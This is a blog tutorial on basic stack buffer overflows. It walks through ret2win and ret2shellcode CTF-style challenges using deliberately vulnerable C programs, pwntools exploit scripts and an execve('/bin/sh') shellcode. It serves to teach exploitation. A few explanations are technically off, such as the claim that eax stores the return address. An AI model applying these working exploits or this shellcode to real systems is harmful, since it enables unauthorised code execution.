---
title: "Basic Stack Based Overflows"
categories: ["Hacking", "Binary Exploitation"]
tags: ["Buffer Overflows", "Exploit Development", "Stack Based Overflows", "pwntools", "pentesting", "hacking"]
date: "2021-07-01"
type: "post"
weight: 400
keywords: "hacking binary exploitation overflows buffer overflows pwntools exploit development"
---

## Overview

Stack based buffer overflows are old as fuck. Like I was literally dead when the most advanced techniques for exploiting them were conceived. However [pwntools](https://github.com/Gallopsled/pwntools) is a exploitation framework that has been around for a much shorter period of time and adds a new level of simplicity which makes exploit development more approachable. Of course there exist a great number of **better** binary exploitation courses and guides, a few of which I will link in the [resources](#resources) section bellow. However, from my experience there are far less complete guides/tutorials on modern binary exploitation which wield the full potential of pwntools and other tools. That is not to say that really good pwntools based tutorials and writeups do not exist and I will also link and specify those, the [pwntools](https://github.com/Gallopsled/pwntools-write-ups) repo itself features a number of useful example writeups which I highly recommend. 

With that said lets explore some basic stack based buffer overflows with pwntools and [pwndbg](https://github.com/pwndbg/pwndbg), a plugin for [gdb](https://www.gnu.org/software/gdb/).


#### ‣ [What is a buffer overflow?](#a-buffer-what)
#### ‣ [ret2win](#ret2win)
#### ‣ [ret2shellcode](#ret2shellcode)
#### ‣ [Resources](#resources)

## A buffer what??

This will not be the best place to start learning about what a buffer overflow is but to quote my [SecSheets](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Overflows/Buffer%20Overflows/Buffer%20Overflows.md) repo.

> "Buffer Overflows are a type of binary exploitation which arise from poor programing practices and memory allocation in memory managed programing languages like C. They are an example of 'mixing data and control'."

In this case we focus on those that overrun memory on the stack.

### The Stack

The stack is a region within a programs [address space](https://devsheets.cybernetic.coffee/os/virtual-memory/#address-space-layout), which in many operating systems have a structure similar to the following. 


```
Stack Bottom +------------> +---------------------------------------------------+        +
                            |                                                   |        |
                            |                                                   |        |
                            |                                                   |        |
                            |                   Stack Region                    |        |
                            |                                                   |        |
                            |                                                   |        |     Lower Memory Addresses
                            +------------------------+--------------------------+        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        v                          |        v
Stack Top    +----------->  +---------------------------------------------------+
                            |                                                   |
                            |                                                   |
                            |                  Shared Libraries                 |
                            |                                                   |
                            |                                                   |
                            +---------------------------------------------------+        ^
                            |                        ^                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            |                        |                          |        |
                            +------------------------+--------------------------+        |     Higher Memory Addresses
                            |                                                   |        |
                            |                                                   |        |
                            |                   Heap Region                     |        |
                            |                                                   |        |
                            |                                                   |        |
                            +---------------------------------------------------+        +
                            |                                                   |
                            |                      Data                         |
                            |                                                   |
                            +---------------------------------------------------+
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            |                      Text                         |
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            |                                                   |
                            +---------------------------------------------------+

```

+ For all intensive purposes we will think about the stack growing **down** towards **lower memory** addresses.

### A Buffer

A buffer is simply a fixed size data structure into which data is stored. In the case of buffer overflows we only really care about buffers that we can control the data to. In the real world identifying these buffers is far from a linear process with massive codebases and many paths through the code. However here we will only explore small binaries which mimic just small segments of larger programs. 

If the function which which reads client/user supplied data into a buffer is unguarded or improperly guarded, meaning it reads in more data then the buffer can hold, it is likely possible to overwrite the return pointer on the stack, a special value which controls the order of code execution, to archive near arbitrary code execution. 


### The Return Pointer

When you write a function in C program it will typically have a structure similar to the following.


```C
int 
function() 
{
	return 1;
}
```

When this is compiled by `gcc` or similar C compilers as a 32 bit binary the `return 0;` will be converted to a `ret` x86 instruction of some kind (either `ret`, `retn`, `retf`). The `ret` instruction is actually a simplification of several instructions responsible for redirecting code execution back to the segment of the program that called the function, or in the case of the main function the end segment. Thus the above C code will have the following x86 decompilation.

```nasm
function:
    endbr32
    push ebp
    mov ebp, esp
    add esp, 0x2e23
    mov eax, 0x1
    pop ebp
    retn                ; return to calling function
```

If we can overflow a buffer to this `retn` we can tell the program to return to anywhere in valid memory for the program. We will soon see some useful places to return but for now just know that control of this return pointer is central to stack buffer overflows.


### Important x86 Registers

The letters you see in the x86 assembly above, namely
    + `ebp`
    + `esp`
    + `eax`
are all x86 registers. You can think of them as variables for simplicity. Some of these registers have special meaning conventionally, that is they are **normally** used for these reasons.

+ **eax:** Conventionally (compiler based) stores the address of the return from a function call
+ **esp:** Extended Stack Pointer, points to the most recent data on the stack
+ **ebp:** Extended Base Pointer, points to the bottom of the stack region
+ **eip:** Extended Instruction Pointer, points to the current instruction to be executed in the program

## ret2win

ret2win short for return to win is a fun category of stack based buffer overflow challenges which are an excellent place to start learning [buffer overflows](https://en.wikipedia.org/wiki/Buffer_overflow). 

The name characterizes the technique of controlling the return pointer of a function, via a buffer overflow, to jump to a `win()` function somewhere else in the binary. This function will typically grant the attacker a shell or leak the flag/file directly. 

Although 'win' functions, functions that do something desireable for the attacker, do exist in real programs they are far more common in CTF challenges like the one we will walk through.

### A Typical ret2win challenge

To begin with lets take a look at a very simple buffer overflow challenge with the following C source code.

```C

#include <stdio.h>
#include <stdlib.h>

void 
win(void) 
{ 
    system("/bin/bash"); 
}

void 
vuln() 
{
  char buf[42];
  setbuf(stdout, NULL);
  printf("Here we goooooooooo...\n");
  gets(buf);
}

int 
main(int argc, char **argv) 
{ 
    vuln(); 
}
```

If we open this binary in a decompiler like the excellent [binaryninja](https://binary.ninja/) or more famous [IDA](https://hex-rays.com/IDA-free/), we would be able to view the x86 instructions that make up this program. Since this binary is very small and simple I will not get into [reverse engineering](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Reversing/Reversing.md#reversing) here and will instead make a separate blog on reversing. Thus for now we will use [pwndbgs](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Tooling/Tooling.md#debuggers) `disassemble`  function to view the assembly instructions. 

Simply run `gdb ./programs_name` to launch pwndbg and then we can disassemble the programs functions.

**`>_ disassemble main`**

```nasm
   0x08049278 <+0>:	    endbr32 
   0x0804927c <+4>:	    push   ebp
   0x0804927d <+5>:	    mov    ebp,esp
   0x0804927f <+7>:	    and    esp,0xfffffff0
   0x08049282 <+10>:	    call   0x8049298 <__x86.get_pc_thunk.ax>
   0x08049287 <+15>:	    add    eax,0x206d
   0x0804928c <+20>:	    call   0x8049225 <vuln>
   0x08049291 <+25>:	    mov    eax,0x0
   0x08049296 <+30>:	    leave  
   0x08049297 <+31>:	    ret
```

**Aside:** pwndbg is a python plugin/wrapper for gdb with enhanced features. 

**`>_ disassemble vuln`**

```nasm
   0x08049225 <+0>:	    endbr32 
   0x08049229 <+4>:	    push   ebp
   0x0804922a <+5>:	    mov    ebp,esp
   0x0804922c <+7>:	    push   ebx
   0x0804922d <+8>:	    sub    esp,0x34
   0x08049230 <+11>:	    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049235 <+16>:	    add    ebx,0x20bf
   0x0804923b <+22>:	    mov    eax,DWORD PTR [ebx-0x4]
   0x08049241 <+28>:	    mov    eax,DWORD PTR [eax]
   0x08049243 <+30>:	    sub    esp,0x8
   0x08049246 <+33>:	    push   0x0
   0x08049248 <+35>:	    push   eax
   0x08049249 <+36>:	    call   0x8049090 <setbuf@plt>
   0x0804924e <+41>:	    add    esp,0x10
   0x08049251 <+44>:	    sub    esp,0xc
   0x08049254 <+47>:	    lea    eax,[ebx-0x12e2]
   0x0804925a <+53>:	    push   eax
   0x0804925b <+54>:	    call   0x80490b0 <puts@plt>
   0x08049260 <+59>:	    add    esp,0x10
   0x08049263 <+62>:	    sub    esp,0xc
   0x08049266 <+65>:	    lea    eax,[ebp-0x32]
   0x08049269 <+68>:	    push   eax
   0x0804926a <+69>:	    call   0x80490a0 <gets@plt>         ; dAnGeR <---------- 
   0x0804926f <+74>:	    add    esp,0x10
   0x08049272 <+77>:	    nop
   0x08049273 <+78>:	    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049276 <+81>:	    leave  
   0x08049277 <+82>:	    ret  
```

**`>_ disassemble win`**

```nasm
   0x080491f6 <+0>:	    endbr32 
   0x080491fa <+4>:	    push   ebp
   0x080491fb <+5>:	    mov    ebp,esp
   0x080491fd <+7>:	    push   ebx
   0x080491fe <+8>:	    sub    esp,0x4
   0x08049201 <+11>:	    call   0x8049298 <__x86.get_pc_thunk.ax>
   0x08049206 <+16>:	    add    eax,0x20ee
   0x0804920b <+21>:	    sub    esp,0xc
   0x0804920e <+24>:	    lea    edx,[eax-0x12ec]
   0x08049214 <+30>:	    push   edx
   0x08049215 <+31>:	    mov    ebx,eax
   0x08049217 <+33>:	    call   0x80490c0 <system@plt>
   0x0804921c <+38>:	    add    esp,0x10
   0x0804921f <+41>:	    nop
   0x08049220 <+42>:	    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049223 <+45>:	    leave  
   0x08049224 <+46>:	    ret
```

Cooooollll, but what do we actually care about here?? That would be the function called `vuln` and thats not just because of its name its also because of this little function called `gets` which features @ instruction `0x0804926a`. If we read the `man` page for gets with `man gets`, we will soon see the beautiful line

> Never  use  gets().   Because  it is impossible to tell without knowing the data in advance how many characters gets() will read,  and  because  gets() will  continue  to  store  characters past the end of the buffer, it is extremely dangerous to use.  It has been used  to  break  computer  security. Use fgets() instead.

which pretty much sums it up. `gets` is an example of an **unguarded** function, we can use it to overrun the `42` bytes allocated to our buffer, `char buf[42];`. If we send enough input to the program we will even be able to overwrite data on the programs stack up to the `vuln` functions `ret` pointer. Since we have a function `win` which creates a `bash` shell for us we also have a useful place to redirect code execution.

Our goal then is too:

1. Overflow the buffer by the right amount to reach the return pointer
2. Redirect code execution to the win function
3. Win


### Exploit Script

We can now begin crafting an exploit with pwntools, which is a handy python library for exploit development. We start by importing the library and establishing a link to the compiled program we wish to exploit/hack.

```python
from pwn import *

target_binary = process('./win_example')
```

We are now in a position to receive and send data from/to the binary `win_example` (the program from above). Without getting into the details of pwntools, which is better left to the [pwntools tutorial](https://github.com/Gallopsled/pwntools-tutorial#readme) or perhaps my [cheatsheet](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Tooling/PwntoolsCheatsheet.md#pwntools-cheatsheet) we can now receive the banner, which is the text printed to the terminal at the start when the binary runs, and work out the amount of data we need to send to overflow the buffer to the return.

To do this we can make use of the tool cyclic, which comes with pwntools. Cyclic creates a patterned string of desired length which we can transmit to the binary to observe which part of the string overflowed the return address. We add `gdb.attach(target_binary)` to the exploit script in order to attach with gdb to the program while the exploit runs.

```python
from pwn import *

target_binary = process('./win_example')

# attach to the running program in
# pwdbg and break at the main function
gdb.attach(target_binary, 'break main')

# receive the banner from the 
# program
log.info(target_binary.recvuntil('Here we goooooooooo...\n'))

# send pattern string to overflow buffer
overflow_test = cyclic(100)                 # create a pattern of 100 bytes in length
target_binary.sendline(overflow_test)
target_binary.interactive()
```

If we do this and then type `continue` or `c` in the `pwndbg` window that opens we will see the binary crash with a `segfault`.

> Program received signal SIGSEGV, Segmentation fault.

Which happens when the program attempts to return to:

> Invalid address 0x616f6161

We know this because the `EIP` register points to `0x616f6161` which is not a valid place for the program to return to. In fact this 'address' is the ASCII value for `aaoa`, a part of the cyclic pattern string we sent to the program. Pwndbg also tells us the value as a string that this address corresponds to. 

This means that to overflow to just **before**, that is 4 bytes before (the size of one instruction), the return pointer of the function (`vuln` in this case) we must supply up to `aaoa` bytes of the cyclic string to the program. We can work out what this is as a decimal value using the `cyclic_find` function which tells us the offset to a particular 4 byte part of the pattern.

```python
from pwn import *

target_binary = process('./win_example')

# attach to the running program in
# pwdbg and break at the main function
gdb.attach(target_binary, 'break main')

# receive the banner from the 
# program
log.info(target_binary.recvuntil('Here we goooooooooo...\n'))

# send pattern string to overflow buffer
# overflow_test = cyclic(100)
bytes_to_before_ret = cyclic_find(b'aaoa')		# 54
log.info(f'{bytes_to_before_ret}')				

target_binary.sendline(overflow_test)
target_binary.interactive()
```

Running the exploit with the `DEBUG` arg as follows:

`python3 exploit_script.py DEBUG`

will print the values wrapped in `log.info()` to the terminal (stdout). Doing so tells us that the pattern occurs `54` bytes into the pattern string. 

For us this means that we need to transmit **54 bytes** to the program to overwrite all the data on the stack to just before the return pointer.

We are now ready to overwrite the return pointer with the address of the `win` function which will cause the program to redirect execution from `vuln` to `win`. The address of `win` is just another 4 byte quantity like x86 instructions, in fact it is just the address of the **first** instruction in the win function. Since no [memory protections](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Theory/MemoryProtections.md#binary-memory-protections) are enabled on the binary we can simply look at the address of wins' first instruction in gdb and then hardcode the value into our exploit.

To do so we repeat the process of disassembly from earlier,

> `pwndbg> disassemble win`

and take the first address `0x080491f6` on the far right which is the instruction `endbr32`. 

However we can do this in a **better** way with pwntools using the `ELF()` function as follows.

```python
from pwn import *

target_binary = process('./win_example')
elf = ELF('./win_example')

# attach to the running program in
# pwdbg and break at the main function
gdb.attach(target_binary, 'break main')

# receive the banner from the 
# program
log.info(target_binary.recvuntil('Here we goooooooooo...\n'))

# send pattern string to overflow buffer
# overflow_test = cyclic(100)
bytes_to_before_ret = cyclic_find(b'aaoa')		# 54
log.info(f'{bytes_to_before_ret}')				

# Hook the address of win from
# symbols
win_addr = elf.symbols['win']
log.info(f'Win @ {hex(win_addr)}')              # [*] Win @ 0x80491f6 


target_binary.sendline('TODO')
target_binary.interactive()
```

The `ELF` function lets us read symbols from the [ELF](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) executable format, with the assumption that symbols are present (see [stripped binary](https://en.wikipedia.org/wiki/Stripped_binary)).   

We now have everything we need to redirect code execution to `win` and pwn the binary. To place the address of `win` onto the stack at the return we must send it to the binary in [little endian](https://en.wikipedia.org/wiki/Endianness) form since the binary runs on a 32 bit little endian machine. What this looks like is a backwards version of the address,

> \xf6\x91\x04\x08

as a byte string. This again can be simplified with pwntools using the `p32` function as follows.

```python
from pwn import *

target_binary = process('./win_example')
elf = ELF('./win_example')

# attach to the running program in
# pwdbg and break at the main function
# gdb.attach(target_binary, 'break main')

# receive the banner from the 
# program
log.info(target_binary.recvuntil('Here we goooooooooo...\n'))

# send pattern string to overflow buffer
# overflow_test = cyclic(100)
bytes_to_before_ret = cyclic_find(b'aaoa')		# 54
log.info(f'{bytes_to_before_ret}')				

# Hook the address of win from
# symbols
win_addr = elf.symbols['win']
log.info(f'Win @ {hex(win_addr)}')

# pad with A bytes to ret -> win
payload = b'A' * bytes_to_before_ret + p32(win_addr)

target_binary.sendline(payload)
# get the shell
target_binary.interactive()
```

Finally we can employ another pwntools function `fit` or `flat` to simplify the exploit with the knowledge that the return pointer is **54 bytes away** from the controlled buffer.

```python
from pwn import *

target_binary = process('./win_example')
elf = ELF('./win_example')

# receive the banner from the 
# program
log.info(target_binary.recvuntil('...\n'))
			
# Hook the address of win from
# symbols
win_addr = elf.symbols['win']
log.info(f'Win @ {hex(win_addr)}')

payload = fit({
	54: win_addr
})

target_binary.sendline(payload)
target_binary.interactive()
```

The `fit` or `flat` function writes the variable value at the specified offset(s), in this case `54`, and fills the preceeding byte range with garbage padding. This is the same functionality as padding with A bytes, `b'A' * bytes_to_before_ret`.

## ret2shellcode

> What if we have a buffer overflow on the stack but no win function? Where can we go? 

ret2shellcode is the technique of using the controlled return pointer from a buffer overflow to jump to code we control. The next path of enquire is *"How do we get the code there?"*, in short we place it there ourselves.

### A Note On Memory Protections

[Memory protections](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Theory/MemoryProtections.md), which are effectively a set of mitigations put in place by compilers like `gcc` and kernels like the linux kernel, are a pain for exploit development that we will explore more later on. For now all you need to know is that if the `NX` (No-Execute) bit or protection is not enabled we can execute code on the stack! You can check the compiler protections put in place on the target binary by running a little tool `checksec` which is included with pwntools. Usage is:

+ `checksec <binary>`

The output will resemble the following:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled           <-- if disabled we can execute code in the stack region
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

### Shellcode

So if we can execute on the stack that means we can place code on the stack, in say a **buffer** we control, and then return to it using our control of the return pointer, but what should this code look like?

[Shellcode](https://github.com/Angus-C-git/SecSheets/blob/master/Binary%20Exploitation/Theory/Shellcoding.md) is the historic name given to machine code that hackers would use to pop a shell in attacks like this. At a lower level of course machine code is just binary data that the CPU can understand as instructions but if we wind back to higher levels of abstraction machine code is just a string of opcodes. The opcodes themselves correspond to the human readable assembly instructions, a variant of which is featured above. Some really common opcodes you may have seen floating around or certainly will are:

+ `\0xCC` SIGTRAP (signal trap code)
+ `\0x90` NOP (no operation)

all of these have assembly equivalents, for example in `x86` the above correspond to:

+ `int3` signal trap code
+ `nop` no operation

Ultimately what this means is we can construct turing complete programs with just opcodes although id rather peel my eyes out with a spoon. Which on a happy note brings us back to pwntools our binary exploitation lord and saviour. The `asm()` function is truly a gift and puts the fun back into constructing shellcode to pop a shell (which we would otherwise do with opcodes). The function lets us supply `x86` instructions which will then be converted into a opcode string that we can place on the stack (in this case) to execute our code. 

The following python fragment demonstrates its usage to craft shellcode that will execute the syscall for `exceve('/bin/sh')`:


```python
shellcode = asm('''
    xor eax, eax
    push eax     

    push 0x68732f2f   
    push 0x6e69622f 

    mov ebx, esp   
    push eax

    push ebx
    mov ecx, esp
    mov al, 0xb     

    int 0x80
''')
```

Now I know what you are thinking, *"Do I need to be fluent in x86 this dead language from before I walked the face of the high level language earth?"*. Sort of ? No not really ...

A lot of the time we don't need to do anything too wild with our shellcode for example you can see that even a small fragment like the one above is enough to give us a shell on the system. More complex shellcode may open a file and write its contents into a buffer on the stack which we then read from.

### Writing an Exploit With Shellcode

Now lets take a look at a simple ret2shellcode challenge. The reason it is **simple** is because the address of the buffer on the stack that we will place our shellcode into is leaked by the binary. In harder ret2shellcode challenges you may need to leak the buffer address yourself, with say a format string vuln (which we will explore soon), or guess its location.  

#### C Source

+ This is the source code for the challenge

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int 
hack_me()
{
    // chonk
    char buffer[200];

    printf("Hit me with your best shot @%p\n", &buffer);
    gets(&buffer);

    return 0;
}

int 
main(int argc, char const *argv[])
{   
    hack_me();
    printf("Mission failed");
    return 0;
}
```

When we run the compiled program we receive the following output:


```
Hit me with your best shot @0xffdacae8

```

with an input prompt on the next line. The hex after the @ corresponds to the buffers address on the stack.

#### Exploit

An example exploit for the above binary could be:

```python

from pwn import *
proc = process('./ret2shellcode')

log.info("Receiving banner...")
proc.recvuntil("@")

buffer_addr = int(proc.recvuntil("\n", drop=True), 16)
log.success("Buffer address: " + hex(buffer_addr))

# attach debugger to see in gdb
# gdb.attach(proc) 

shellcode = asm('''
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    push eax     

    push 0x68732f2f   
    push 0x6e69622f 

    mov ebx, esp   
    push eax

    push ebx
    mov ecx, esp
    mov eax, 0xb     

    int 0x80
''')

# send overflow to test offset to return
#overflow = cyclic(350)
offset = cyclic_find("daac")

payload = fit({
    0: shellcode,
    offset: p32(buffer_addr)
})

proc.sendline(payload)
proc.interactive()
```

I highly recommend stepping through the exploit with gdb attached and observing how the flow of the program changes to the buffer and watching as the instructions we placed get executed one by one.

## Resources

*Note the above binaries were compiled with gcc as follows:*

```gcc -z execstack -fno-stack-protector -no-pie -z norelro -m32 -g <c_source> -o <binary>```

+ [Nightmare](https://guyinatuxedo.github.io)
+ [Liveoverflow Binary Exploitation](https://www.youtube.com/watch?v=iyAyN3GFM7A&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
+ [pwntools tutorial](https://github.com/Gallopsled/pwntools-tutorial#readme)
+ [John Hammond Binary Exploitation](https://www.youtube.com/watch?v=yH8kzOkA_vw&list=PL1H1sBF1VAKVg451vJ-rx0y_ZuQMHPamH)
+ [SecSheets](https://github.com/Angus-C-git/SecSheets/tree/master/Binary%20Exploitation)

